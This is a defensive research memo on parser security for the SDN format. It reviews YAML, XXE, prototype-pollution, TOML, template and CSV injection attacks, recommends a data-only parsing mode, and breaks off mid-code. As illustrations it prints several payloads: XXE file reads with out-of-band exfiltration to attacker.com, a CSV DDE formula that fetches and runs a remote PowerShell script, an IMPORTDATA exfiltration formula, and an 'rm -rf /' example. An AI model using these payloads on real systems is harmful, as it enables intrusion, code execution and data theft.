# Data Format Parser Security Research
**Date:** 2026-01-31
**Purpose:** Defensive security research for Simple language SDN parser hardening
**Focus:** Security benefits of separating data processing from operation processing

---

## Executive Summary

This research investigates security vulnerabilities in data format parsers (YAML, JSON, XML, TOML, CSV) where mixing operational capabilities with data parsing creates attack vectors. The findings strongly support implementing a **data-only mode** for SDN parser as a recognized security pattern that prevents entire classes of vulnerabilities including:

- **Remote Code Execution (RCE)** via deserialization
- **Data exfiltration** through template injection
- **Denial of Service (DoS)** via entity/nesting expansion
- **Configuration injection** attacks

The "data-only" pattern is widely recognized in industry (PyYAML's `safe_load`, JSON's `JSON.parse` vs `eval`) and prevents critical CVEs that have affected major organizations.

---

## 1. Known Attacks on Data Formats that Mix Operations and Data

### 1.1 YAML Deserialization Attacks

**Attack Vector:** YAML's ability to deserialize arbitrary objects enables RCE when parsing untrusted input.

#### Critical CVEs

**CVE-2022-1471 - SnakeYAML (Java)**
- **Severity:** CVSS 9.8 (Critical)
- **Impact:** Remote code execution
- **Root Cause:** SnakeYAML allows instantiation of arbitrary Java classes from untrusted YAML sources
- **"Insecure by default" design** led to at least 8 different vulnerabilities before official CVE designation
- **Exploitation:** Attacker provides YAML with `!!python/object` or `!!java/object` tags to instantiate malicious classes
- **Source:** [SnakeYAML CVE-2022-1471 Deep Dive](https://www.greynoise.io/blog/cve-2022-1471-snakeyaml-deserialization-deep-dive), [Snyk Advisory](https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/)

**CVE-2026-24009 - Docling-Core (Python)**
- **Impact:** RCE via PyYAML's FullLoader
- **Attack:** Document processing pipeline → remote shell
- **Root Cause:** Using `yaml.FullLoader` instead of `SafeLoader` allows deserialization of arbitrary Python objects
- **Quote:** "If you can get the application to parse a malicious YAML file, you can execute code on the server"
- **Source:** [DEV Community Analysis](https://dev.to/cverports/cve-2026-24009-yaml-deserialization-the-gift-that-keeps-on-giving-in-docling-core-1don)

**CVE-2017-18342 - PyYAML (Python)**
- **Versions Affected:** < 5.1
- **Impact:** RCE through `yaml.load()` without SafeLoader
- **Patched:** Version >= 5.1 requires explicit `Loader=` parameter
- **Source:** [Net-Square Analysis](https://net-square.com/yaml-deserialization-attack-in-python.html)

**Real-World Impact:**
- Yahoo (2017): PHP unserialize() vulnerability led to RCE on bug bounty system
- Ruby on Rails (2013): YAML deserialization flaw allowing arbitrary code execution
- Multiple applications using SnakeYAML affected across enterprise systems
- **Source:** [Snyk Insecure Deserialization](https://learn.snyk.io/lesson/insecure-deserialization/)

---

### 1.2 XML External Entity (XXE) Attacks

**Attack Vector:** XML parsers that resolve external entities can be exploited for file disclosure, SSRF, and DoS.

#### Attack Types

**1. File Disclosure (In-band XXE)**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```
**Result:** Parser returns contents of `/etc/passwd` in application response

**2. Server-Side Request Forgery (SSRF)**
- Define external entity using attacker-controlled URL
- Force server to make requests to internal network resources
- Scan internal ports and systems from perspective of vulnerable server
- **Source:** [OWASP XXE Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

**3. Out-of-Band (OOB) XXE**
- Application makes network requests to attacker-controlled server
- Exfiltrate data through DNS queries or HTTP requests when direct response isn't possible
- **Source:** [PortSwigger XXE Tutorial](https://portswigger.net/web-security/xxe)

**4. Denial of Service - Billion Laughs Attack**
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... continues to lol9 ... -->
]>
<lolz>&lol9;</lolz>
```
- **Expansion:** < 1 KB XML → 3 GB memory usage
- **Mechanism:** 10 entities, each containing 10 of previous entity = 10^9 expansions
- **Impact:** Exponential memory/CPU consumption, server crash
- **Source:** [Billion Laughs Attack](https://en.wikipedia.org/wiki/Billion_laughs_attack), [OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

**Impact:**
- Confidential data disclosure (passwords, API keys, source code)
- Internal network reconnaissance and SSRF attacks
- Port scanning from server perspective
- Denial of service through resource exhaustion
- **Source:** [HackerOne XXE Guide](https://www.hackerone.com/knowledge-center/xxe-complete-guide-impact-examples-and-prevention)

---

### 1.3 JSON Injection / Prototype Pollution

**Attack Vector:** JavaScript parsers that don't sanitize keys allow modification of `Object.prototype`.

#### How Prototype Pollution Works

**Root Cause:**
- JavaScript functions recursively merge user-controllable properties into objects
- `JSON.parse()` treats any key as arbitrary string, including `__proto__`
- No sanitization → attacker can pollute global prototype chain
- **Source:** [PortSwigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)

**Attack Chain:**
1. **Source:** User input containing `__proto__` or `constructor.prototype`
2. **Gadget:** Property passed into sink without filtering
3. **Sink:** Code that enables arbitrary code execution (e.g., `eval()`, DOM manipulation)

**Example Vulnerable Code:**
```javascript
// Parsing JSON with dangerous key
let userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
// Now ALL objects inherit isAdmin: true
```

#### Critical CVEs

**CVE-2022-42743 - deep-parse-json**
- **Package:** deep-parse-json 1.0.2
- **Impact:** Prototype pollution through malicious JSON input
- **Source:** [Snyk Advisory](https://security.snyk.io/vuln/SNYK-JS-DEEPPARSEJSON-3104597)

**CVE-2021-23820, CVE-2022-4742 - json-pointer**
- **Impact:** Remote code execution via prototype chain manipulation
- **Source:** [Snyk Advisory](https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577287)

**CVE-2021-3918 - json-schema**
- **Impact:** Prototype pollution enabling RCE
- **Source:** [Snyk Advisory](https://security.snyk.io/vuln/SNYK-JS-JSONSCHEMA-1920922)

**CVE-2024-21505 - web3-utils**
- **Impact:** Cryptocurrency wallet compromise via prototype pollution
- **Source:** [Snyk Advisory](https://security.snyk.io/vuln/SNYK-JS-WEB3UTILS-6229337)

**Impact:**
- **Client-side:** DOM-based XSS, account takeover, session hijacking
- **Server-side:** Remote code execution, privilege escalation
- **Real-world:** Data theft, credential harvesting, DoS
- **Source:** [IBM Security - Prototype Pollution](https://medium.com/@ibm_ptc_security/prototype-pollution-df29453f015c)

---

### 1.4 TOML Configuration Injection

**Attack Vector:** TOML parsers that execute embedded commands or allow prototype pollution.

#### Critical CVEs

**CVE-2025-61260 - OpenAI Codex CLI (Command Injection)**
- **Severity:** CVSS 9.8 (Critical)
- **Disclosure:** December 1, 2025
- **Attack Mechanism:**
  1. Attacker creates `.env` file: `CODEX_HOME=./.codex`
  2. Creates `./.codex/config.toml` with malicious MCP server entries containing shell commands
  3. Developer clones repository and runs `codex`
  4. Tool **automatically executes** embedded commands without warnings
- **Root Cause:** Project-local configuration treated as trusted execution material
- **No validation:** No interactive approval, no secondary validation, no re-check on changes
- **Impact:** Arbitrary command execution on developer machines (cloud tokens, SSH keys, source code access)
- **Source:** [CheckPoint Research](https://research.checkpoint.com/2025/openai-codex-cli-command-injection-vulnerability/), [CyberPress](https://cyberpress.org/openai-codex-cli-command-injection-vulnerability/)

**CVE-2025-54803 - js-toml (Prototype Pollution)**
- **Attack:** Maliciously crafted TOML with `__proto__` key
- **Impact:** Modify properties on global `Object.prototype`
- **Fixed:** Version 1.0.2
- **Source:** [GitHub Advisory](https://github.com/advisories/GHSA-65fc-cr5f-v7r2)

**Attack Scenarios:**
- Credential harvesting from developer machines
- Supply chain attacks via repository cloning
- Secret exfiltration (cloud tokens, API keys)
- Lateral movement through compromised developer environments
- **Source:** [Cyera Research Labs - Gemini CLI](https://www.cyera.com/research-labs/cyera-research-labs-discloses-command-prompt-injection-vulnerabilities-in-gemini-cli)

---

### 1.5 Template Injection in Configuration Files

**Attack Vector:** Configuration parsers that interpret template syntax enable RCE through formula/expression evaluation.

#### Server-Side Template Injection (SSTI)

**How it Works:**
- User input concatenated directly into template instead of passed as data
- Template engine interprets attacker-controlled syntax (e.g., `{{...}}`, `<%= ... %>`)
- Malicious expressions executed server-side with application privileges
- **Source:** [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)

**Configuration File Access Example:**
```python
# Flask/Jinja2 vulnerability
@app.route('/page')
def page():
    name = request.args.get('name', '')
    # VULNERABLE: name is inserted into template
    return render_template_string(f'Hello {name}!')

# Attack payload:
# http://target.com/page?name={{config.items()}}
# Result: Exposes application configuration (API keys, DB credentials)
```

**Attack Capabilities:**
- **Information Disclosure:** Access environment variables, config files, database records
- **RCE:** Execute arbitrary code via template expressions
- **Data Exfiltration:** Read sensitive files and transmit to attacker
- **Example:** `{{config.items()}}` displays all Flask configuration settings
- **Source:** [OWASP SSTI Testing](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection), [Imperva SSTI](https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/)

**Real-World Impact:**
- Credential theft (API keys, database passwords)
- Source code disclosure
- System takeover via RCE
- Lateral movement to other systems
- **Source:** [CheckPoint SSTI Analysis](https://research.checkpoint.com/2024/server-side-template-injection-transforming-web-applications-from-assets-to-liabilities/)

---

### 1.6 CSV Injection (Formula Injection)

**Attack Vector:** Spreadsheet applications execute formulas in CSV files starting with `=`, `+`, `-`, `@`.

#### How CSV Injection Works

**Mechanism:**
- Applications export data to CSV without sanitizing user input
- Spreadsheet software (Excel, LibreOffice Calc) interprets cells starting with formula characters as executable code
- Formulas can leverage **DDE (Dynamic Data Exchange)** to launch applications and execute commands
- **Source:** [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)

**Attack Example:**
```csv
username,comment
alice,"Normal comment"
bob,"=cmd|'/c calc.exe'!A1"
```
When opened in Excel: Launches calculator (or any command)

**Advanced Exploitation:**
```csv
=IMPORTDATA("http://attacker.com/exfil?data="&A1:Z100)
```
**Result:** Exfiltrates entire spreadsheet to attacker server

#### Attack Capabilities

**1. Command Execution via DDE**
- Excel's DDE feature enables launching arbitrary applications
- Example: `=cmd|'/c powershell -c IEX(wget attacker.com/payload.ps1)'!A1`
- **CVE-2014-3524:** Exploits spreadsheet software vulnerabilities
- **Source:** [Veracode CSV Injection](https://www.veracode.com/blog/secure-development/data-extraction-command-execution-csv-injection)

**2. Data Exfiltration**
- Formulas can read and transmit spreadsheet contents
- Access other open spreadsheets in same session
- Send data via HTTP requests or external links
- **Source:** [Medium - What is CSV Injection](https://medium.com/cryptogennepal/what-is-a-csv-injection-attack-9208b54b4598)

**3. Exploiting Security Warning Fatigue**
- Users download CSV from "trusted" internal application
- Ignore security warnings because source seems legitimate
- Malicious formulas execute with user's privileges
- **Source:** [SecureLayer7 CSV Injection](https://blog.securelayer7.net/how-to-perform-csv-excel-macro-injection/)

#### Mitigation

**Filter Formula Characters:**
- Strip leading `=`, `+`, `-`, `@` from all cells
- Prepend single quote `'` to force text interpretation
- Also filter field separators (`,`, `;`) and quotes (`"`, `'`) to prevent cell boundary manipulation
- **Source:** [HackTricks Formula Injection](https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection)

---

## 2. How Data-Only Handler (No Ops) Prevents Attacks

### 2.1 Preventing Injection via Structural Operation Restriction

**Core Principle:** Separating data representation from operational capabilities eliminates entire attack classes.

#### Attack Prevention Matrix

| Attack Type | Requires Operations | Prevented by Data-Only Mode |
|-------------|---------------------|----------------------------|
| **Deserialization RCE** | Object instantiation, method calls | ✅ Yes - no object construction |
| **XXE File Disclosure** | External entity resolution | ✅ Yes - no external references |
| **Prototype Pollution** | Property assignment to `__proto__` | ✅ Yes - no prototype chain access |
| **Template Injection** | Expression evaluation | ✅ Yes - no template engine |
| **CSV Formula Injection** | Formula execution | ✅ Yes - no formula evaluation |
| **SSRF** | Network request capabilities | ✅ Yes - no URL resolution |
| **DoS (Entity Expansion)** | Recursive entity resolution | ✅ Yes - no entity expansion |

#### Why Data-Only Works

**1. No Code Execution Path**
- Parser only constructs primitive data structures (strings, numbers, arrays, maps)
- No ability to instantiate arbitrary classes or call methods
- No expression evaluation or template rendering
- **Example:** PyYAML's `safe_load` vs `load`

**2. No External Resource Access**
- Cannot resolve external entities or URLs
- Cannot read files or make network requests
- All data must be inline and explicitly provided
- **Example:** XML parser with DTD processing disabled

**3. No Prototype/Object Model Manipulation**
- Keys treated as literal strings, not object paths
- Cannot modify language-level constructs (prototypes, classes)
- No access to special properties like `__proto__`, `constructor`
- **Example:** JSON parsers that sanitize keys

**4. No Recursive Expansion**
- Limit nesting depth (typically 100-1000 levels)
- Disable entity expansion and macro substitution
- Fixed-size data structures, no unbounded growth
- **Example:** XML parsers with `FEATURE_SECURE_PROCESSING`

---

### 2.2 Primitive-Only Parsing as Security Boundary

**Definition:** Parser restricted to primitive types (bool, int, float, string, array, dict) with no operational semantics.

#### Security Benefits

**1. Minimal Attack Surface**
- Only 6 data types to handle (bool, int, float, string, array/list, dict/map)
- No complex object graphs or reference cycles
- No reflection or introspection capabilities
- Predictable memory consumption

**2. Type Safety Enforcement**
- Static typing prevents type confusion attacks
- No implicit conversions that could bypass validation
- Explicit schema validation at parsing boundary
- **Source:** [NCSC Pattern: Safely Importing Data](https://www.ncsc.gov.uk/guidance/pattern-safely-importing-data)

**3. Full Recognition Before Processing**
- **Recognizer Pattern:** Accept/reject input before processing
- Validate entire input structure before constructing data
- No partial processing that could leak state
- **Quote:** "A recognizer has the sole task of accepting or rejecting input: it enforces the rule of full recognition before processing"
- **Anti-pattern:** "Shotgun parser" where validation is spread across implementation and program logic grabs data before full correctness is assured
- **Source:** [Curing the Vulnerable Parser (USENIX)](https://www.usenix.org/system/files/login/articles/login_spring17_08_bratus.pdf)

**4. Defense in Depth**
- Data-only mode as outer security layer
- Schema validation as secondary layer
- Application-level validation as tertiary layer
- Sandboxing/isolation as final layer

---

## 3. SDN-Specific Attack Surface Analysis

### 3.1 Table Definitions - Injection Risks

**Attack Vector:** Maliciously crafted table schemas could exploit parser assumptions.

#### Field Injection

**Scenario:** Attacker controls table definition in SDN file
```sdn
# Malicious table schema
users |id, username, __proto__, role|
    1, admin, malicious_value, superuser
```

**Risk:** If parser uses field names as object keys without sanitization:
- Could pollute prototype chain (like JSON prototype pollution)
- Bypass security checks if special fields are trusted
- Inject hidden columns that application doesn't expect

**Mitigation:**
- Whitelist allowed field names (alphanumeric + underscore only)
- Reject reserved keywords (`__proto__`, `constructor`, `prototype`)
- Validate schema against expected structure before parsing rows
- Use array-based row representation instead of dict if field names are untrusted

#### Row Overflow / Memory Exhaustion

**Scenario:** Table with massive row count or column count
```sdn
# Malicious table with 1 million rows
data |col1, col2, col3, ... col10000|
    # 1 million rows follow...
```

**Risk:**
- Unbounded memory allocation leading to OOM
- CPU exhaustion during parsing
- DoS attack on parser or application

**Mitigation:**
- Enforce maximum row count limit (e.g., 100,000 rows)
- Enforce maximum column count (e.g., 1,000 columns)
- Stream-based parsing for large tables instead of loading all into memory
- Configurable limits based on context (config files vs data processing)

---

### 3.2 Path Traversal via Dotted Paths

**Attack Vector:** If SDN supports dotted notation for nested keys, attackers could exploit path interpretation.

**Example Scenarios:**

#### Scenario 1: File Path References
```sdn
config:
    import_path: ../../etc/passwd
    plugin_dir: /../../root/.ssh/id_rsa
```

**Risk:** If application uses these paths to load files:
- Path traversal to read arbitrary files
- Escape from intended directory structure
- Access sensitive system files

**Mitigation:**
- Never use SDN values directly as file paths
- Validate all paths are within allowed directory (use realpath/canonicalization)
- Use allowlist of permitted paths, not blocklist
- **Source:** [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

#### Scenario 2: Key Path Injection
```sdn
# If SDN uses dotted keys for nested structures
settings:
    user.profile.name: "Alice"
    user.profile.../../admin.role: "superuser"  # Path traversal in key
```

**Risk:** If parser interprets `..` in key paths:
- Escape intended namespace hierarchy
- Overwrite unrelated configuration
- Bypass access controls based on key structure

**Mitigation:**
- Disallow `..`, `/`, `\` in key names
- Treat dotted notation as namespace separator only (like TOML)
- Validate key structure matches expected schema
- Use explicit nesting with braces/indentation instead of dotted keys

---

### 3.3 String Interpolation Risks

**Current Status:** SDN does not currently support string interpolation (no `${var}` or `{expr}` syntax).

**Future Risk:** If interpolation is added without proper sandboxing:

#### Template Injection
```sdn
# If SDN added template syntax
message: "Hello {user.name}"
command: "ls {config.dir}"  # Could execute shell commands
```

**Attack:**
```sdn
user:
    name: "Alice'; DROP TABLE users; --"

command: "{system('rm -rf /')}"
```

**Recommendation:**
- **DO NOT add string interpolation** to SDN format
- If absolutely required, use **safe substitution only**:
  - Variable lookup, not expression evaluation
  - No function calls or method invocation
  - Whitelist of allowed variables
  - Escape/sanitize all substituted values
- Consider it out-of-scope for parser (let application handle it)

---

### 3.4 Inline Dict/Array Nesting Depth

**Attack Vector:** Deeply nested inline structures causing stack overflow.

#### Malicious Nesting Example
```sdn
data:
    level1: {
        level2: {
            level3: {
                # ... continues for 10,000 levels
                level10000: "attack"
            }
        }
    }
```

**Risk:**
- Stack overflow in recursive parser
- Exponential memory consumption
- Parser crash or DoS
- **Similar to:** JSON parsers, Protobuf JsonFormat (Issue #25071)
- **Source:** [Protobuf Nesting DoS](https://github.com/protocolbuffers/protobuf/issues/25071)

#### Mitigation Strategies

**1. Enforce Nesting Depth Limit**
```rust
const MAX_NESTING_DEPTH: usize = 100;

fn parse_value(input: &str, depth: usize) -> Result<Value, Error> {
    if depth > MAX_NESTING_DEPTH {
        return Err(Error::NestingTooDeep);
    }
    // ... parse logic with depth+1 for nested structures
}
```

**2. Use Iterative Parsing Instead of Recursive**
- Stack-based iterative parser instead of recursive descent
- Explicit stack structure with bounded size
- Prevents stack overflow even with deep nesting

**3. Configurable Limits**
- Default: 100 levels (sufficient for legitimate use)
- Config files: 10 levels (should be very flat)
- Data processing: 1,000 levels (if needed for tree structures)

---

### 3.5 Large Table Rows - Memory Exhaustion

**Attack Vector:** Individual rows with extremely large values causing memory exhaustion.

#### Attack Examples

**1. Massive String Values**
```sdn
logs |timestamp, message|
    2026-01-31, "AAAA...AAAA"  # 1 GB of 'A' characters
```

**2. Large Array/Dict in Cell**
```sdn
users |id, metadata|
    1, {data: [1,2,3,...,1000000]}  # 1 million element array
```

**Risk:**
- OOM (Out of Memory) condition
- Parser crash or system instability
- DoS attack through resource exhaustion
- **Similar to:** Rack multipart parser (CVE-2025-61771, CVE-2025-61772)
- **Source:** [Rack Memory Exhaustion](https://github.com/advisories/GHSA-w9pc-fmgc-vxvw)

#### Mitigation Strategies

**1. Cell Size Limits**
```rust
const MAX_CELL_SIZE: usize = 1_000_000;  // 1 MB per cell

fn parse_table_cell(input: &str) -> Result<Value, Error> {
    if input.len() > MAX_CELL_SIZE {
        return Err(Error::CellTooLarge {
            size: input.len(),
            max: MAX_CELL_SIZE,
        });
    }
    // ... parse cell value
}
```

**2. Total Table Size Limits**
```rust
const MAX_TABLE_SIZE: usize = 100_000_000;  // 100 MB per table

struct TableParser {
    total_bytes_parsed: usize,
}

impl TableParser {
    fn parse_row(&mut self, row: &str) -> Result<Vec<Value>, Error> {
        self.total_bytes_parsed += row.len();
        if self.total_bytes_parsed > MAX_TABLE_SIZE {
            return Err(Error::TableTooLarge);
        }
        // ... parse row
    }
}
```

**3. Streaming / Lazy Parsing**
- Don't load entire table into memory
- Parse row-by-row with iterator interface
- Allow application to process incrementally
- Drop rows after processing to free memory

---

## 4. Real-World Examples: Format Parsing → RCE / Data Exfiltration

### 4.1 Remote Code Execution Examples

#### JBoss Deserialization (CVE-2015-7501)
- **Impact:** RCE on thousands of JBoss servers
- **Attack:** Malicious serialized Java object in HTTP request
- **Capability:** Install web shells, create admin accounts, exfiltrate data
- **Widespread exploitation** in the wild
- **Source:** [Snyk Insecure Deserialization](https://learn.snyk.io/lesson/insecure-deserialization/)

#### Yahoo PHP Unserialize (2017)
- **Target:** Yahoo bug bounty system
- **Attack:** Crafted serialized PHP object
- **Impact:** Full RCE on production system
- **Source:** [Understanding Insecure Deserialization](https://snynr.medium.com/understanding-insecure-deserialization-risks-and-mitigations-e726dcf624e7)

#### Ruby on Rails YAML (2013)
- **Attack:** YAML deserialization flaw
- **Impact:** Arbitrary code execution on Rails apps
- **Widespread impact** across Ruby ecosystem
- **Source:** [Deserialization RCE Examples](https://medium.com/@instatunnel/deserialization-of-untrusted-data-unpacking-a-remote-code-execution-vulnerability-a772591dbf5a)

#### Fortinet VPN (2020)
- **Attack:** Insecure deserialization in FortiOS
- **Impact:** Multiple RCE vulnerabilities
- **Scope:** Thousands of enterprise VPNs compromised
- **Source:** [OWASP Insecure Deserialization](https://owasp.org/www-community/vulnerabilities/Insecure_Deserialization)

#### React2Shell (CVE-2025-55182)
- **Target:** React Server Components (RSC)
- **Attack:** Deserialization of untrusted RSC data
- **Impact:** SNOWLIGHT and COMPOOD malware families
- **Capability:** Full server compromise via RSC deserialization
- **Source:** [React2Shell Analysis](https://instatunnel.my/blog/react2shell-cve-2025-55182-the-deserialization-ghost-in-the-rsc-machine)

---

### 4.2 Data Exfiltration Examples

#### Cloud Metadata Exploitation
- **Attack:** RCE used to query AWS/GCP metadata endpoints (`169.254.169.254`)
- **Stolen:** IAM roles, database credentials, API keys
- **Lateral movement:** Compromised credentials used to access cloud resources
- **Source:** [PortSwigger Deserialization Exploitation](https://portswigger.net/web-security/deserialization/exploiting)

#### Configuration File Theft via SSTI
- **Attack:** Template injection to read configuration files
- **Example payload:** `{{config.items()}}` in Flask/Jinja2
- **Exfiltrated:**
  - Database passwords
  - API keys and secrets
  - Internal service endpoints
  - Encryption keys
- **Source:** [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)

#### CSV Formula Exfiltration
- **Attack:** `=IMPORTDATA("http://attacker.com/exfil?data="&A1:Z100)`
- **Stolen:** Entire spreadsheet contents sent to attacker
- **Also access:** Other open spreadsheets in same session
- **Source:** [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)

#### XXE Out-of-Band Data Theft
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
```
**Attacker's evil.dtd:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```
- **Result:** Contents of `/etc/passwd` sent to attacker server
- **Blind exfiltration:** Works even when response isn't displayed
- **Source:** [PortSwigger XXE](https://portswigger.net/web-security/xxe)

---

### 4.3 Impact Summary

**Complete System Compromise:**
- Attackers gain full control over vulnerable systems
- Persistence through backdoors and web shells
- Lateral movement to other systems in network
- **Source:** [Imperva Deserialization](https://www.imperva.com/learn/application-security/deserialization/)

**Sensitive Data Theft:**
- Credentials (passwords, API keys, tokens)
- Customer data (PII, financial information)
- Intellectual property (source code, algorithms)
- Configuration and secrets

**Supply Chain Attacks:**
- Developer machine compromise (Codex CLI)
- Malicious dependencies and packages
- Build system infiltration

---

## 5. "Data-Only" Mode as Recognized Security Pattern

### 5.1 Industry-Standard Safe Parsers

The "data-only" pattern is widely recognized and implemented across programming languages as a security best practice.

#### PyYAML: safe_load vs load

**Safe Version:**
```python
import yaml

# ✅ SECURE: Only constructs standard YAML objects
data = yaml.safe_load(untrusted_input)
```

**Unsafe Version:**
```python
# ❌ DANGEROUS: Can execute arbitrary Python objects
data = yaml.load(untrusted_input)  # Equivalent to pickle.load()
```

**Key Differences:**
- `safe_load()` restricts parser to **basic Python objects only**: strings, numbers, lists, dicts
- `load()` allows **arbitrary object instantiation** and method calls
- **Quote:** "yaml.load is as powerful as pickle.load and so may call any Python function"
- **Recommendation:** "You should always use yaml.safe_load and yaml.safe_dump as the standard I/O methods for YAML"
- **Source:** [RealPython YAML](https://realpython.com/python-yaml/), [TheLinuxCode safe_load](https://thelinuxcode.com/yaml-safe-load/)

**Industry Adoption:**
- PyYAML 5.1+ requires explicit `Loader=` parameter to use unsafe loading
- Most Python applications standardized on `safe_load()`
- Libraries like `ruamel.yaml` default to safe mode
- **Source:** [PyYAML Deprecation](https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation)

---

#### JSON.parse vs eval

**Safe Version:**
```javascript
// ✅ SECURE: Only parses JSON data structures
const data = JSON.parse(untrustedInput);
```

**Unsafe Version:**
```javascript
// ❌ DANGEROUS: Executes arbitrary JavaScript code
const data = eval("(" + untrustedInput + ")");
```

**Key Differences:**
- `JSON.parse()` is **data-only**: constructs JavaScript values without code execution
- `eval()` executes any JavaScript expression with **full privileges**
- **Quote:** "JSON.parse parses JSON text into a JavaScript object without executing any potentially harmful code"
- **Performance:** `JSON.parse()` is **10-100x faster** than `eval()`
- **Source:** [JSON Utils Deep Dive](https://jsonutils.online/en/blog/javascript-json-parse-deep-dive)

**Security Benefits:**
- No code execution path
- No access to global scope or functions
- Native browser implementation (optimized and sandboxed)
- **Quote:** "A JSON parser will recognize only JSON text and will not compile scripts"
- **Source:** [W3Schools JSON Eval](https://www.w3schools.com/js/js_json_eval.asp)

---

#### XML: Disabling DTD Processing

**Safe Configuration:**
```java
// Java - Disable DTD processing entirely
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
```

```python
# Python - Use defusedxml library
from defusedxml import ElementTree
tree = ElementTree.parse(untrusted_file)
```

**Why This Works:**
- **Disabling DTDs** eliminates XXE attacks entirely
- No external entity resolution possible
- Prevents billion laughs (entity expansion) attacks
- **Quote:** "Disabling DTDs also makes the parser secure against denial of services (DOS) attacks such as Billion Laughs"
- **Source:** [OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

**Alternative: Safe Entity Limits**
```python
# Limit entity expansion if DTDs needed
parser = lxml.etree.XMLParser(
    resolve_entities=False,  # Disable external entities
    no_network=True,         # Block network access
)
```

---

### 5.2 Pattern Recognition in Security Literature

The "data-only" pattern is recognized under several names in security research:

#### 1. Recognizer Pattern

**Definition:** Parser that validates input structure before constructing data.

**Key Principle:**
- **Quote:** "A recognizer has the sole task of accepting or rejecting input: it enforces the rule of full recognition before processing"
- Validate entire input before building any objects
- No partial processing that could leak state or resources
- **Source:** [Curing the Vulnerable Parser (USENIX)](https://www.usenix.org/system/files/login/articles/login_spring17_08_bratus.pdf)

**Anti-Pattern: Shotgun Parser:**
- **Quote:** "Validation is spread across an implementation, and program logic grabs data from the input-handling code before the full data's correctness is assured"
- Creates dependencies that are hard to follow
- Leads to vulnerabilities through incomplete validation
- **Source:** [USENIX Parser Security](https://www.usenix.org/system/files/login/articles/login_spring17_08_bratus.pdf)

---

#### 2. Safe Deserialization Pattern

**Principle:** Restrict deserialization to primitive types and known-safe structures.

**Implementations:**
- PyYAML's `SafeLoader`
- JSON.parse() (JavaScript)
- PHP's `json_decode()` vs `unserialize()`
- Java's `ObjectInputStream` with custom resolvers

**Quote from OpenStack Security:**
- "Avoid dangerous file parsing and object serialization libraries"
- Use safe alternatives that don't execute code
- **Source:** [OpenStack Security Guidelines](https://security.openstack.org/guidelines/dg_avoid-dangerous-input-parsing-libraries.html)

---

#### 3. Defense in Depth for Parsers

**Multi-Layer Validation:**

**Layer 1: Parser Level (Data-Only Mode)**
- Accept only primitive types
- No external references or operations
- Enforce size and nesting limits

**Layer 2: Schema Validation**
- Validate structure matches expected schema
- Type checking and constraint enforcement
- Reject unknown or unexpected fields

**Layer 3: Application Validation**
- Business logic validation
- Cross-field consistency checks
- Authorization and access control

**Layer 4: Sandboxing**
- Parse untrusted input in isolated process/container
- Limit resources (memory, CPU, network)
- Minimize privileges

**Quote:**
- "By itself, safe_load() is not sufficient for entirely untrusted sources; when dealing with highly untrusted YAML sources, apply multi-layered validation"
- **Source:** [TheLinuxCode safe_load](https://thelinuxcode.com/yaml-safe-load/)

**Additional Measures:**
- Sandbox parsing in separated processes/containers
- Enforce strict access control on config files
- Never allow untrusted users write access to parsed files
- **Source:** [Coddy YAML Safe Loading](https://ref.coddy.tech/yaml/yaml-safe-loading)

---

#### 4. DARPA SafeDocs Initiative

**Goal:** "Make documents safe for users to open without concern of cyber attacks"

**Approach:**
- Formal specifications for document formats
- Mathematically verified parsers
- Eliminate "weird machines" in file formats
- **Source:** [DARPA SafeDocs](https://www.darpa.mil/research/programs/safe-documents)

**Relevance to Data-Only Pattern:**
- Simpler formats with fewer features are more verifiable
- Data-only parsers have smaller attack surface
- Easier to formally prove correctness

---

### 5.3 Best Practices Summary

**Consensus from Security Community:**

1. **Default to Safe Mode**
   - Safe parsers should be the default
   - Unsafe modes require explicit opt-in
   - PyYAML 5.1+ enforces this with required `Loader=` parameter

2. **Never Parse Untrusted Input with Unsafe Parsers**
   - Always use `safe_load`, `JSON.parse`, disabled DTDs
   - Treat configuration files from external sources as untrusted
   - Developer machines are attack vectors (Codex CLI)

3. **Implement Multiple Validation Layers**
   - Parser-level restrictions (data-only)
   - Schema validation
   - Application validation
   - Sandboxing for defense in depth

4. **Enforce Resource Limits**
   - Maximum nesting depth
   - Maximum string/cell size
   - Maximum total input size
   - Timeout for parsing operations

5. **Principle of Least Privilege**
   - Parse with minimal necessary features
   - Disable external references (URLs, file paths)
   - No code execution or template evaluation
   - No access to system resources

---

## 6. Recommendations for SDN Parser Hardening

### 6.1 Implement Data-Only Mode

**Primary Security Layer:**

```rust
// SDN Parser Configuration
pub struct SdnParserConfig {
